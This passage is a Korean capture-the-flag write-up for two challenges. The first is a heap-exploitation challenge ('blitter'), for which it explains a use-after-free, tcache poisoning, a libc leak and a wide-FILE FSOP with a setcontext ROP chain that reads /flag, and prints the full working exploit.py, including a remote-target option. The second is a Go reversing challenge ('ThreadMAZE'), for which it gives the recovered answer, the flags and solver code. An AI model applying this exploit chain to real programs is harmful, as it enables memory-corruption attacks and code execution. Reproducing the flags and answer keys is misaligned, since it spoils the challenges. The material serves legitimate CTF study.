| `a1` | `plane, align_exp, width, height` | `posix_memalign`으로 plane 할당. `plane<20`, `5<=align_exp<=21`, `1<=width<=4096`, `1<=height<=96`, `16<=ceil(width/8)*height<=0xc000` |
| `a2` | `plane` | plane 버퍼 해제 후 설명자 초기화 |
| `a4` | `plane, offset, length, data` | plane 버퍼로 `memcpy` |
| `b1` | `channel, plane` | plane의 포인터와 크기를 channel에 복사. `channel<8` |
| `b2` | `channel` | channel 설명자 초기화 |
| `b3` | `channel, offset, length, data` | channel 버퍼의 각 바이트에 입력을 XOR |
| `c1` | `plane` | 버퍼 전체의 1비트 수를 합산하고 `panel <plane> <count>` 출력 |

전역 channel 테이블은 PIE+`0x4080`에 있으며 항목당 16바이트(`ptr`, `length`)이다. plane 테이블은 PIE+`0x4100`에 있으며 항목당 24바이트(`ptr`, `width`, `height`, `stride`, `length`)이다.

### 취약점과 첫 번째 겹침

`b1`은 포인터를 복사할 뿐 소유권을 추적하지 않는다. 그 뒤 `a2`가 원래 plane을 해제해도 channel은 포인터를 보유한다. 따라서 `b3`으로 해제된 청크의 tcache 메타데이터를 XOR할 수 있다. 반면 `c1`은 살아 있는 plane만 검사하므로, 메타데이터를 읽으려면 두 plane이 같은 청크를 가리키게 만들어야 한다.

작은 할당은 요청 크기 `0x110`(`width=2176,height=1,align_exp=5`)으로 만든다. 실제 청크 크기는 `0x120`이다. 초기 할당의 반환 포인터는 힙 페이지 기준 `p0=+0x360`, `p1=+0x480`, `p2=+0x5a0`, `p5=+0x6c0`이며 32바이트 정렬 청크가 `0x120` 간격으로 놓인다. 이 오프셋은 로컬 ASLR 반복 실행에서 일정했다.

`channel0 -> p1`을 복사하고 p0, p1을 해제한다. tcache head는 p1이고, p1의 safe-linked `next`는 p0이다. `b3(channel0,0,p64(0x360 ^ 0x5a0))`을 적용하면 `next`가 살아 있는 p2로 바뀐다. `a1`을 두 번 더 실행하면 p1과 p2가 차례로 반환된다. 이제 원래 plane2와 새 plane4가 같은 p2를 가리킨다.

plane4를 해제하고 plane2에서 `c1`을 호출하면 해제 청크의 메타데이터를 popcount로 관찰한다. 각 비트를 임시로 XOR한 뒤 다시 복원하며 카운트 차이를 비교하면 64비트 값 전체를 읽을 수 있다. 이 방식으로 `p5 ^ (p2>>12)`를 얻고 safe-linking 변환을 역산하여 힙 주소를 구한다. 해제된 p5의 `next`도 바로잡아 작은 tcache 체인을 정상적으로 비울 수 있게 한다.

### libc 주소 누출

plane5~19와 plane3, 총 16개의 `0x120` 청크를 해제해 해당 tcache bin을 채운다. 이어 겹친 plane4를 해제하면 p2는 unsorted bin으로 들어간다. plane2는 여전히 p2를 가리키므로 같은 popcount 비트 오라클로 `fd`를 읽는다. 제공된 libc에서 이 값은 `libc_base+0x212bd8`이다. 로컬 테스트에서는 계산된 libc 베이스가 페이지 정렬로 검증되었다.

### 큰 tcache 청크를 통한 libc 영역 할당

제공된 glibc 2.43의 `posix_memalign`은 tcache 후보 주소의 `ptr-8`에 있는 크기 필드가 요청 크기 클래스와 정확히 일치하는지 확인한다. 따라서 stdout 주소를 바로 tcache의 `next`로 지정하면 해당 후보가 건너뛰어진다. libc의 쓰기 가능 영역에는 `libc+0x212238`에 자연적으로 `0x8000`이라는 값이 있다. 바로 뒤인 `libc+0x212240`은 32바이트 정렬을 만족하므로 크기 `0x8000`의 가짜 청크 사용자 포인터로 사용할 수 있다.

`width=2944,height=89`는 요청 크기 `0x7ff0`과 실제 청크 크기 `0x8000`을 만든다. 첫 프레임에서 작은 청크 18개와 함께 이 크기의 q0, q1을 할당해 위치를 고정했다. `q0=p2+0x1200`, `q1=q0+0x8000`이다. `channel3`에 q1을 복사하고 q0, q1을 해제하면 큰 tcache 체인이 `q1 -> q0`가 된다. libc 누출 후 channel3으로 q1의 safe-linked `next`를 `q0 ^ (libc+0x212240)`만큼 XOR한다. 다음 큰 할당은 q1, 그다음은 libc 가짜 청크를 반환한다. 이 큰 tcache 동작과 주소 관계는 로컬 및 원격에서 별도 확인했다.

가짜 청크를 plane1로 받은 순간 필수 `memset(0x7ff0)`이 libc 쓰기 가능 상태의 넓은 범위를 지운다. 이 프레임이 끝나며 `ok 4`를 출력하기 전에 `a4`로 실제 `_IO_2_1_stdout_`(`libc+0x213580`)에 사용 가능한 비버퍼링 FILE 객체를 작성하고, 바로 뒤의 `stdout` 전역 포인터(`libc+0x213668`)도 그 주소로 설정한다. 이 객체는 자체 주소를 기준으로 한 short buffer, lock, wide-data 포인터와 정식 `_IO_file_jumps` vtable을 가진다. libc의 `puts` 경로는 정식 `_IO_2_1_stdout_` 객체를 직접 참조하므로 해당 주소를 복구하는 것이 중요하다. 복구 프레임의 `ok 4` 응답을 수신해 이 단계의 생존을 확인한다.

### 종료 시 wide-FILE FSOP

libc 가짜 청크 영역 안에 별도의 fake FILE과 관련 구조를 배치한다.

| 객체 | 주소 |
| --- | --- |
| fake FILE | `target+0x3000` |
| wide_data | `target+0x3200` |
| fake wide vtable | `target+0x3400` |
| read context / write context | `target+0x3600` / `target+0x3800` |
| open ROP / 후속 피벗 | `target+0x3a00` 이후 |
| 파일 경로 / 읽기 버퍼 / lock | `target+0x4000` / `target+0x4200` / `target+0x4400` |

fake FILE의 `_mode`는 1, 정식 vtable은 `_IO_wfile_jumps`(`libc+0x211228`)로 설정한다. wide-data의 write_base는 0, write_ptr은 1, buf_base는 0이다. fake wide vtable의 `doallocate` 슬롯(+`0x68`)에는 `setcontext+61`(`libc+0x4bebd`)을 넣는다. 모든 구조를 작성한 뒤 `_IO_list_all`(`libc+0x213480`)을 fake FILE로 바꾼다. EOF를 보내면 프로그램이 `panel off`를 출력하고 종료 flush를 수행한다. 이때 `_IO_flush_all` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → fake `doallocate` 경로로 제어 흐름이 넘어간다. `_IO_wdoallocbuf`의 간접 호출 시 `rdx`에 fake FILE 포인터가 들어가므로 `setcontext+61`이 이 구조를 context로 읽는다. `setcontext` 시작점의 `rt_sigprocmask` 호출은 seccomp에서 막히기 때문에 해당 syscall을 건너뛰는 `+61` 진입점을 쓴다.

첫 ROP는 `open("/flag", O_RDONLY)`를 실행한다. 이어 두 개의 `setcontext+61` 레코드로 `read(3,buf,0x100)`, `write(1,buf,0x100)`, `exit(0)`를 수행한다. 대상 프로세스의 표준 입력·출력·오류가 fd 0~2를 사용하므로 열린 flag 파일은 fd 3이 된다. 로컬 검증에서는 제공된 `extracted/deploy/flag`를 읽고, 원격에서는 `/flag`를 읽도록 분기했다.

사용한 libc 가젯 오프셋은 `pop rsp; ret` `0x3ca45`, `pop rbp; ret` `0x28a8d`, `pop rdx; leave; ret` `0xa018d`, `pop rax; ret` `0xe5e47`, `pop rdi; ret` `0x11bcfa`, `pop rsi; ret` `0x5c2e7`, `syscall; ret` `0xa0c46`이다. `pop rdx; leave; ret`은 후속 context를 `rdx`로 전달하면서 다음 스택으로 피벗한다. ROP의 syscall은 seccomp에서 허용한 `open`, `read`, `write`, `exit`만 사용한다.

### 재현

```bash
cd pwn/02-blitter

# 제공된 loader와 libc를 사용하는 로컬 실행
python3 -u exploit.py

# 일반 ELF 로딩 경로를 재현한 로컬 실행
python3 make_direct.py
python3 -u exploit.py --direct-local

# 공식 문제 서비스
python3 -u exploit.py --remote 3.36.45.164:11011
```

로컬 실행은 `FLAG{LOCAL_BLITTER_LARGE_FSOP_ORW_OK}`를 출력하고 종료 코드 0으로 끝났다. 공식 서비스에서도 동일한 wide-FILE/ORW 경로로 플래그를 획득했으며, `flag.txt`에 저장했다. 기존 작업 기록에는 문제 제출도 승인되었다고 적혀 있다.

최종 보관 플래그는 다음과 같다.

```text
FLAG{df3c8af1185f2d658e4ef9f6924c1e621582ce7b3d6d90eab8d15e36e6261d56c2ae769294bb27f9e37205a927049d7603f324c9af44065a34192513b5612645203df98727ad5d66}
```

최종 감사에서 당시 대화의 제출 로그를 다시 확인했다. 위 값은 원격에서 두 번 회수된 뒤 CTFd 플래그 입력란에 그대로 제출됐고, 직후 정답 승인과 다음 문제 해금이 기록된 실제 accepted 값이다. `blitter_flag.txt`의 `c5c…` 값은 다른 원격 인스턴스에서 회수된 별도 값으로 보존하되 대표 플래그로 사용하지 않는다.

### 최종 풀이 코드 전체

아래 코드는 최종 산출물의 원문 전체다. `solve.py`는 표준 진입점이고, 실제 exploit 체인은 `exploit.py`에 있다.

#### `solve.py`

```python
#!/usr/bin/env python3
"""Standard entry point for the verified blitter exploit.

With no arguments this uses the supplied loader, libc, and local challenge
binary.  A network connection is made only when ``--remote HOST:PORT`` is
passed explicitly; all options are implemented by :mod:`exploit`.
"""

from exploit import main


if __name__ == "__main__":
    main()
```

#### `exploit.py`

```python
#!/usr/bin/env python3
"""Offline-first BLT-9000 exploit development harness.

Local mode uses only the supplied ELF, loader and libc. No connection is made
unless --remote is explicitly selected.
"""

import argparse
import os
import re
import select
import socket
import struct
import subprocess
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LD = ROOT / "extracted/lib/ld-linux-x86-64.so.2"
LIB = ROOT / "extracted/lib"
BIN = ROOT / "extracted/deploy/blitter"


def p64(x):
    return struct.pack("<Q", x & ((1 << 64) - 1))


def leb(n):
    assert 0 <= n < (1 << 32), n
    out = bytearray()
    while n >= 0x80:
        out.append((n & 0x7f) | 0x80)
        n >>= 7
    out.append(n)
    return bytes(out)


def alloc(idx, align=5, width=2176, height=1):
    return b"\xa1" + b"".join(map(leb, (idx, align, width, height)))


def free(idx):
    return b"\xa2" + leb(idx)


def write(idx, off, data):
    return b"\xa4" + leb(idx) + leb(off) + leb(len(data)) + data


def alias(ch, idx):
    return b"\xb1" + leb(ch) + leb(idx)


def clear(ch):
    return b"\xb2" + leb(ch)


def xor(ch, off, data):
    return b"\xb3" + leb(ch) + leb(off) + leb(len(data)) + data


def checksum(idx):
    return b"\xc1" + leb(idx)


def unprotect(value):
    """Invert glibc's PROTECT_PTR for a heap pointer (position is same page)."""
    out = value
    for _ in range(6):
        out = value ^ (out >> 12)
    return out


class Transport:
    def __init__(self, remote=None, direct_local=False):
        self.process = None
        self.sock = None
        self.direct_local = direct_local
        if remote:
            host, port = remote.rsplit(":", 1)
            self.sock = socket.create_connection((host, int(port)), timeout=5)
            self.sock.settimeout(10)
        else:
            env = os.environ.copy()
            env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_max=4294967296:glibc.cpu.x86_rep_stosb_threshold=2056"
            if direct_local:
                env["LD_LIBRARY_PATH"] = str(LIB)
                argv = [str(ROOT / "blitter-direct")]
            else:
                argv = [str(LD), "--library-path", str(LIB), str(BIN)]
            self.process = subprocess.Popen(
                argv,
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                env=env, bufsize=0,
            )
        self.banner = [self.readline(), self.readline()]
        if b"BLT-9000" not in self.banner[0]:
            raise RuntimeError(f"unexpected banner: {self.banner!r}")

    def readexact(self, count):
        out = bytearray()
        while len(out) < count:
            if self.sock:
                chunk = self.sock.recv(count - len(out))
            else:
                if not select.select([self.process.stdout], [], [], 5)[0]:
                    raise TimeoutError(f"local process gave no output after {len(out)} bytes")
                chunk = os.read(self.process.stdout.fileno(), count - len(out))
            if not chunk:
                raise EOFError(f"short read {len(out)}/{count}")
            out.extend(chunk)
        return bytes(out)

    def readline(self):
        out = bytearray()
        while True:
            c = self.readexact(1)
            out.extend(c)
            if c == b"\n":
                return bytes(out)

    def emit(self, *ops):
        packet = b"".join(ops)
        if not 1 <= len(packet) <= 4096:
            raise ValueError(f"invalid frame length {len(packet)}")
        frame = struct.pack("<H", len(packet)) + packet
        if self.sock:
            self.sock.sendall(frame)
        else:
            self.process.stdin.write(frame)
            self.process.stdin.flush()

    def send(self, *ops):
        self.emit(*ops)
        panels = []
        while True:
            line = self.readline().strip()
            if line.startswith(b"panel "):
                m = re.fullmatch(rb"panel (\d+) (\d+)", line)
                if not m:
                    raise RuntimeError(f"unexpected panel line: {line!r}")
                panels.append((int(m[1]), int(m[2])))
            elif line.startswith(b"ok "):
                if int(line[3:]) != len(ops):
                    raise RuntimeError(f"partial execution: {line!r}, expected {len(ops)}")
                return panels
            else:
                raise RuntimeError(f"unexpected response: {line!r}")

    def close(self):
        if self.sock:
            self.sock.close()
        elif self.process:
            if self.process.stdin is not None:
                self.process.stdin.close()
            if self.process.poll() is None:
                self.process.wait(timeout=2)


def bit_oracle(t, plane, channel, offset, bits=64):
    """Read bytes from a freed chunk through popcount and transient XOR flips."""
    baseline = t.send(checksum(plane))[0][1]
    ops = []
    for bit in range(bits):
        mask = bytes((1 << (bit & 7),))
        off = offset + bit // 8
        ops += [xor(channel, off, mask), checksum(plane), xor(channel, off, mask)]
    samples = t.send(*ops)
    assert len(samples) == bits, (len(samples), bits)
    value = 0
    for bit, (idx, count) in enumerate(samples):
        if idx != plane or count not in (baseline - 1, baseline + 1):
            raise RuntimeError(f"invalid oracle sample {bit}: {idx}, {count}; baseline {baseline}")
        if count == baseline - 1:
            value |= 1 << bit
    assert t.send(checksum(plane))[0][1] == baseline
    return value


def stage1(t):
    # Initial fixed page offsets are stable across ASLR under the supplied
    # loader/glibc: p0=+0x360, p1=+0x480, p2=+0x5a0, p5=+0x6c0.
    # 0x110 payloads yield contiguous 0x120 chunks with no alignment slivers.
    large = lambda idx: alloc(idx, width=2944, height=89)
    t.send(alloc(0), alloc(1), alloc(2), *(alloc(i) for i in range(5, 20)), large(3), large(4))
    # Park the large-bin pair in tcache immediately. This fixes their heap
    # positions before any protocol response or checksum printing can cause
    # service-specific allocations; channel3 keeps a UAF handle to q1.
    t.send(alias(3, 4), free(3), free(4), alias(0, 1), free(0), free(1))
    t.send(xor(0, 0, p64(0x360 ^ 0x5a0)))
    t.send(alloc(3), alloc(4))  # p3 == p1; p4 == live p2
    t.send(alias(1, 4), alias(2, 5))
    t.send(free(5), free(4))
    encoded = bit_oracle(t, 2, 1, 0)
    p5 = unprotect(encoded)
    p2 = p5 - 0x120
    if p5 & 0xfff != 0x6c0 or p2 & 0xfff != 0x5a0:
        raise RuntimeError(f"heap layout changed: p5={p5:#x}, p2={p2:#x}")
    print(f"heap p5={p5:#x}, p2={p2:#x}, encoded_fd={encoded:#x}")
    # p5's `next` is zero because it was freed while a bogus tcache head was
    # p2>>12. Change it to PROTECT_PTR(p5, NULL), allowing the bin to drain.
    t.send(xor(2, 0, p64(p5 >> 12)))
    t.send(alloc(4), alloc(5))
    return p2, p5


def stage2(t, p2, p5):
    # Fill all 16 entries of the glibc 2.43 small tcache bin, then free the
    # overlapped chunk. Its unsorted-bin fd/bk now point into main_arena.
    t.send(*(free(i) for i in range(5, 20)), free(3))
    t.send(free(4))
    arena_link = bit_oracle(t, 2, 1, 0)
    libc_base = arena_link - 0x212bd8
    libc_base += int(os.environ.get("BLT_LIBC_DELTA", "0"), 0)
    if libc_base & 0xfff or libc_base < 0x700000000000:
        raise RuntimeError(f"invalid libc base {libc_base:#x} from {arena_link:#x}")
    print(f"libc={libc_base:#x}, main_arena_link={arena_link:#x}")
    return libc_base


FAKE_USER_SIZE = 0x7FF0
FAKE_WIDTH = 2944       # ceil(width / 8) == 368
FAKE_HEIGHT = 89        # 368 * 89 == 0x7ff0; malloc chunk size == 0x8000
FAKE_LIBC_OFF = 0x212240

# All offsets below were checked against the supplied libc build.  Several
# short gadgets intentionally begin inside another instruction.
POP_RSP = 0x3CA45
POP_RAX = 0xE5E47
POP_RDI = 0x11BCFA
POP_RSI = 0x5C2E7
POP_RBP = 0x28A8D
POP_RDX_LEAVE = 0xA018D       # pop rdx ; leave ; ret
SYSCALL_RET = 0xA0C46
SETCONTEXT_61 = 0x4BEBD       # skips forbidden rt_sigprocmask syscall
WFILE_JUMPS = 0x211228
IO_LIST_ALL = 0x213480


def large_alloc(idx):
    return alloc(idx, align=5, width=FAKE_WIDTH, height=FAKE_HEIGHT)


def isolated_stdout_payload(libc, fake):
    """Build an unbuffered FILE at the canonical _IO_2_1_stdout_ address.

    Its pointers refer to backing space inside the controlled libc chunk, so
    the remote stdout object's incidental pre-exploit state is irrelevant.
    """
    out = bytearray(0xE0)
    shortbuf = fake + 0x83
    lock = fake + 0x100
    wide = fake + 0x180
    put64(out, 0x00, 0xFBAD2887)
    for off in (0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38):
        put64(out, off, shortbuf)
    put64(out, 0x40, shortbuf + 1)
    put64(out, 0x68, 0)
    put64(out, 0x70, 1)
    put64(out, 0x78, -1)
    put64(out, 0x80, 0x0A000000)
    put64(out, 0x88, lock)
    put64(out, 0x90, -1)
    put64(out, 0xA0, wide)
    put64(out, 0xC0, 0xFFFFFFFF)
    put64(out, 0xD8, libc + 0x211030)  # _IO_file_jumps
    return bytes(out)


def poison_large_tcache_to_libc(t, p2, libc):
    """Return a live plane whose data pointer is libc+FAKE_LIBC_OFF."""
    target = libc + FAKE_LIBC_OFF

    # stage1 has already allocated q0/q1 before any response-side allocator
    # noise, parked them in the large tcache as q1 -> q0, and retained the UAF
    # channel3 on q1.  Consume that exact parked chain directly.  Reallocating
    # and attempting alias(3, ...) again is invalid because channel3 is live.
    q0 = p2 + 0x1200
    q1 = q0 + 0x8000
    if t.process:
        # Local verification only; exploit logic never consumes these values.
        from pathlib import Path
        maps = Path(f"/proc/{t.process.pid}/maps").read_text().splitlines()
        pie = int(next(
            x.split("-")[0] for x in maps
            if (x.endswith("/deploy/blitter") or x.endswith("/blitter-direct"))
            and " 00000000 " in x
        ), 16)
        with open(f"/proc/{t.process.pid}/mem", "rb", buffering=0) as mem:
            parked = os.pread(mem.fileno(), 16, pie + 0x4080 + 3 * 16)
        parked_q1, parked_len = struct.unpack("<QQ", parked)
        print(f"large parked q0={q0:#x} q1={q1:#x} channel3={parked_q1:#x} target={target:#x}")
        if parked_q1 != q1 or parked_len != FAKE_USER_SIZE:
            raise RuntimeError(
                f"unexpected parked large layout p2={p2:#x} q0={q0:#x} "
                f"q1={q1:#x} channel3=({parked_q1:#x},{parked_len:#x})"
            )
    print(f"large derived q0={q0:#x} q1={q1:#x}")
    t.send(xor(3, 0, p64(q0 ^ target)))

    # First pop returns q1. Second pop accepts the natural 0x8000 header at
    # target-8, then memset(0x7ff0) clears the overlapping libc range.  The
    # final FSOP is entirely libc-relative. Restore a self-contained stdout
    # at the canonical FILE address before this frame prints its response.
    fake_stdout = libc + 0x213580
    blob = isolated_stdout_payload(libc, fake_stdout)
    stdout_delta = fake_stdout - target
    stdout_global_delta = (0x213580 + 0xE8) - FAKE_LIBC_OFF
    t.emit(
        large_alloc(0), large_alloc(1),
        write(1, stdout_delta, blob),
        write(1, stdout_global_delta, p64(fake_stdout)),
    )
    restored = t.readline()
    if restored != b"ok 4\n":
        raise RuntimeError(f"target allocation/stdout restore failed: {restored!r}")
    print(f"target allocation and stdout restore confirmed: {restored!r}")
    return target, 0


def put64(blob, off, value):
    blob[off:off + 8] = p64(value)


def context61(rdi, rsi, rdx, rsp, rip):
    """Minimal structure consumed by setcontext+61 in the supplied libc."""
    out = bytearray(0xB0)
    put64(out, 0x68, rdi)
    put64(out, 0x70, rsi)
    put64(out, 0x88, rdx)
    put64(out, 0xA0, rsp)
    put64(out, 0xA8, rip)
    return bytes(out)


def qwords(*values):
    return b"".join(p64(v) for v in values)


def deploy_fsop_orw(t, libc, target):
    """Build a wide-FILE setcontext chain and trigger it at normal exit."""
    fake = target + 0x3000
    wide = target + 0x3200
    wide_vtable = target + 0x3400
    ctx_read = target + 0x3600
    ctx_write = target + 0x3800
    rop_open = target + 0x3A00
    pivot_read = target + 0x3B00
    after_read = target + 0x3C00
    pivot_write = target + 0x3D00
    write_stack = target + 0x3E00
    flag_path = target + 0x4000
    flag_buf = target + 0x4200
    lock = target + 0x4400

    def la(off):
        return libc + off

    # _IO_flush_all sees mode>0 and wide write_ptr>write_base.  Its legitimate
    # _IO_wfile_jumps overflow calls the attacker-controlled wide vtable's
    # doallocate slot.  wdoallocbuf copies rdi to rdx before the indirect call,
    # so setcontext+61 receives the fake FILE as its context without a gadget.
    file_blob = bytearray(0xE8)
    put64(file_blob, 0x88, lock)
    put64(file_blob, 0xA0, wide)
    put64(file_blob, 0xA8, la(POP_RSP))
    file_blob[0xC0:0xC4] = struct.pack("<I", 1)
    put64(file_blob, 0xD8, la(WFILE_JUMPS))

    wide_blob = bytearray(0xE8)
    put64(wide_blob, 0x00, rop_open)  # consumed by pop rsp
    put64(wide_blob, 0x18, 0)         # wide write_base
    put64(wide_blob, 0x20, 1)         # wide write_ptr; makes flush eligible
    put64(wide_blob, 0x30, 0)         # wide buf_base; enters doallocate
    put64(wide_blob, 0xE0, wide_vtable)

    wide_vtable_blob = bytearray(0x70)
    put64(wide_vtable_blob, 0x68, la(SETCONTEXT_61))

    # open("/flag", O_RDONLY), then pivot through two setcontext+61 records.
    # The challenge process has only fds 0/1/2, so the returned flag fd is 3.
    open_rop = qwords(
        la(POP_RAX), 2,
        la(POP_RDI), flag_path,
        la(POP_RSI), 0,
        la(SYSCALL_RET),
        la(POP_RBP), pivot_read,
        la(POP_RDX_LEAVE), ctx_read,
    )
    # pop rdx;leave;ret transfers to [pivot+8] while setting rdx=context.
    pivot_read_blob = qwords(0, la(SETCONTEXT_61))
    after_read_blob = qwords(
        la(POP_RBP), pivot_write,
        la(POP_RDX_LEAVE), ctx_write,
    )
    pivot_write_blob = qwords(0, la(SETCONTEXT_61))
    write_stack_blob = qwords(
        1, la(SYSCALL_RET),
        la(POP_RDI), 0,
        la(POP_RAX), 60,
        la(SYSCALL_RET),
    )

    read_ctx = context61(3, flag_buf, 0x100, after_read, la(SYSCALL_RET))
    write_ctx = context61(1, flag_buf, 0x100, write_stack, la(POP_RAX))

    pieces = (
        (fake, bytes(file_blob)),
        (wide, bytes(wide_blob)),
        (wide_vtable, bytes(wide_vtable_blob)),
        (ctx_read, read_ctx),
        (ctx_write, write_ctx),
        (rop_open, open_rop),
        (pivot_read, pivot_read_blob),
        (after_read, after_read_blob),
        (pivot_write, pivot_write_blob),
        (write_stack, write_stack_blob),
        (flag_path, (b"extracted/deploy/flag\x00" if t.process else b"/flag\x00")),
        (lock, b"\x00" * 16),
    )
    for address, data in pieces:
        t.send(write(1, address - target, data))

    # Link only after every fake object is fully initialized.  The ordinary
    # Per-frame printf uses the restored canonical stdout object.
    t.send(write(1, (libc + IO_LIST_ALL) - target, p64(fake)))
    print(f"armed _IO_list_all={fake:#x}; closing input to run exit flush")

    if t.process:
        t.process.stdin.close()
        output = bytearray()
        deadline = time.time() + 5
        while time.time() < deadline:
            ready, _, _ = select.select([t.process.stdout, t.process.stderr], [], [], 0.2)
            if not ready and t.process.poll() is not None:
                break
            for stream in ready:
                chunk = os.read(stream.fileno(), 4096)
                if chunk:
                    output.extend(chunk)
        rc = t.process.wait(timeout=2)
        print(f"post-FSOP rc={rc}, output={bytes(output).split(bytes(1), 1)[0]!r}")
        return bytes(output)
    t.sock.shutdown(1)
    output = bytearray()
    while True:
        chunk = t.sock.recv(4096)
        if not chunk:
            break
        output.extend(chunk)
    return bytes(output)



def main():
    parser = argparse.ArgumentParser(description="BLT-9000 wide-FILE ORW exploit")
    parser.add_argument("--remote", metavar="HOST:PORT")
    parser.add_argument("--direct-local", action="store_true")
    args = parser.parse_args()

    t = Transport(args.remote, args.direct_local)
    try:
        p2, p5 = stage1(t)
        libc = stage2(t, p2, p5)
        target, _ = poison_large_tcache_to_libc(t, p2, libc)
        if target & 0x1f:
            raise RuntimeError(f"fake libc chunk is not 0x20 aligned: {target:#x}")
        output = deploy_fsop_orw(t, libc, target)
        match = re.search(rb"[A-Za-z0-9_]+\{[^}\r\n]+\}", output)
        if match is None:
            raise RuntimeError(f"ORW returned no flag: {output!r}")
        flag = match.group(0)
        print(f"FLAG={flag.decode(errors='replace')}")
        if args.remote:
            out = ROOT / "flag.txt"
            out.write_bytes(flag + b"\n")
            print(f"saved {out}")
    except Exception:
        if t.process and t.process.poll() is not None:
            print("local process exit", t.process.returncode, "stderr", t.process.stderr.read())
        raise
    finally:
        t.close()


if __name__ == "__main__":
    main()
```

---

## 3. ThreadMAZE

### 결과

- 정답 입력: `iB3F74InASXCvZ9WvxoqOtk943NzPOyi2xJB-DAg6Uzm-ra2`
- 플래그: `FLAG{iB3F74InASXCvZ9WvxoqOtk943NzPOyi2xJB-DAg6Uzm-ra2}`
- 원본 `extracted/prob` 검증 결과: `Correct!`

### 1. 바이너리 구조

바이너리는 섹션 헤더와 사용자 함수명이 제거된 Go ELF다. 초기화 함수에서 다음 공개 상수를 복구했다.

- seed: `5c10292963e2ecfa90795476389b5ae11c66606864c3dd24ebe8127b6afe1f7f`
- 최종 SHA-256 commitment: `23488fd14033922cac310d769b43a396f5af73ec5f8c820c9f531da35719d7f9`

검증기 `0x4fffa0`은 입력 48바이트를 `0x4ff6a0`의 13단계 가역 dispatcher에 넣고, 48·126·18바이트 세 스트림을 512개의 3비트 셀에 scatter한다. 이어 셀 VM과 permutation/add 변환을 적용하고 최종 transcript 해시를 비교한다.

### 2. 코드 레이아웃 캐리어

`0x504720`부터 512개의 primitive 함수가 있고 각 함수에는 다음 길이의 NOP run이 있다.

```text
nop_count = 17 + 32 * s,  0 <= s < 8
```

따라서 함수 레이아웃만으로 512개의 3비트 심볼을 얻는다. 공개 seed로 다음 연산을 역으로 적용했다.

1. `0x4fcc20` 역변환: `C[P[i]] = (B[i] + mask(P[i])) mod 8`
2. `0x4fc8a0`의 1536-op 셀 VM 역변환
3. 공유 visited set을 사용하는 세 scatter domain 역변환

복구된 scatter 직전 스트림은 다음과 같다.

- dispatcher 최종 상태 48바이트: `2fb9239d0fa930b2d8e854058b1f2f3c8acdc72ed5559b71fde353518855afd48245ca9b65095ccf70c6efd4f88543e5`
- post-capsule 126바이트: `09d18bead82e2057...af7fb65586cb`
- post-aux 18바이트: `42bacdb4210927aa27e4fc1dc9817aadd8a9`

### 3. 보조 스트림 언랩

중요한 점은 126·18바이트가 dispatcher의 원시 인자가 아니라 각각 `0x4fb580`, `0x4fb820`을 지난 뒤의 값이라는 것이다.

먼저 `0x4fb820`을 역으로 실행해 raw aux를 얻었다.

```text
5cd4943062f57980a2e3098a60511145be5b
```

그 다음 raw aux와 공개 seed로 `0x4fb580`을 역으로 실행해 raw capsule을 얻었다. 분석 중 가장 큰 함정은 Go stack ABI의 반환 슬롯이었다. 반환값은 callee entry 기준 `+0x70`, 즉 caller 기준 `+0x68`에 있으며 packed argument 뒤에 6바이트 정렬 padding이 있다. `+0x62`로 읽으면 그럴듯한 랜덤 값은 나오지만 최종 역산이 전부 실패한다.

### 4. 13단계 역연산

raw context에서 얻은 실제 단계 순서는 다음과 같다.

```text
11, 5, 4, 10, 12, 0, 1, 9, 6, 3, 8, 2, 7
```

각 단계는 byte permutation, feedback/rotate, HMAC-SHA256 Feistel, PRESENT-CBC, ARX, XTEA-CBC, ChaCha/Salsa 계열 stream XOR, RC4-drop, 그리고 두 개의 VM으로 구성된다. 임의의 `A * 48` 입력을 같은 target context로 순방향 실행해 14개 경계 상태를 캡처했고, 각 역함수가 바로 이전 상태를 정확히 복원하는지 13/13 확인했다.

마지막 48바이트 상태부터 위 순서를 거꾸로 적용하면 정답 입력이 나온다.

### 5. 재현

WSL에서 다음 명령으로 역산과 원본 검증을 동시에 수행한다.

```bash
cd reversing/04-threadmaze
python3 solver.py
```

예상 출력:

```text
input=iB3F74InASXCvZ9WvxoqOtk943NzPOyi2xJB-DAg6Uzm-ra2
flag=FLAG{iB3F74InASXCvZ9WvxoqOtk943NzPOyi2xJB-DAg6Uzm-ra2}
local=> Correct!
```

이 명령을 네트워크 없이 다시 실행한 결과와 핵심 파일의 SHA-256은
`verification.json`에 기록했다.

핵심 역함수 구현은 `fork_stage_inverse.py`, 최종 target context와 trace는 `fork_perm_final_context_*` 파일에 있다.

### 최종 풀이 코드 전체

표준 실행 진입점 `solve.py` 전체:

```python
#!/usr/bin/env python3
"""Standard entry point for the verified ThreadMAZE solver."""

from solver import main


if __name__ == "__main__":
    main()

```

실제 역산과 원본 바이너리 검증을 수행하는 `solver.py` 전체:

```python
#!/usr/bin/env python3
"""Final reproducible solver for UHCON ThreadMAZE."""

from __future__ import annotations

import subprocess
from pathlib import Path

import fork_stage_inverse as inverse

ROOT = Path(__file__).resolve().parent
ALPHABET = set(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")


def solve() -> bytes:
    inverse.FRAME = (ROOT / "fork_perm_final_context_frame.bin").read_bytes()
    trace = (ROOT / "fork_perm_final_context_trace_A.bin").read_bytes()
    inverse.STATES = [trace[i : i + 48] for i in range(0, len(trace), 48)]
    inverse.ORDER = list((ROOT / "fork_perm_final_context_order.bin").read_bytes())
    state = (ROOT / "fork_perm_inverse_first.bin").read_bytes()

    assert len(inverse.FRAME) == 0x18C0
    assert len(inverse.STATES) == 14 and all(len(item) == 48 for item in inverse.STATES)
    assert inverse.ORDER == [11, 5, 4, 10, 12, 0, 1, 9, 6, 3, 8, 2, 7]
    assert len(state) == 48

    for position, stage in enumerate(inverse.ORDER):
        recovered = inverse.INVERSES[stage](inverse.STATES[position + 1])
        assert recovered == inverse.STATES[position], f"stage {stage} inverse mismatch"

    for stage in reversed(inverse.ORDER):
        state = inverse.INVERSES[stage](state)

    assert len(state) == 48 and all(byte in ALPHABET for byte in state)
    return state


def main() -> None:
    candidate = solve()
    text = candidate.decode("ascii")
    print(f"input={text}")
    print(f"flag=FLAG{{{text}}}")

    binary = ROOT / "extracted" / "prob"
    result = subprocess.run(
        [str(binary)],
        input=candidate + b"\n",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
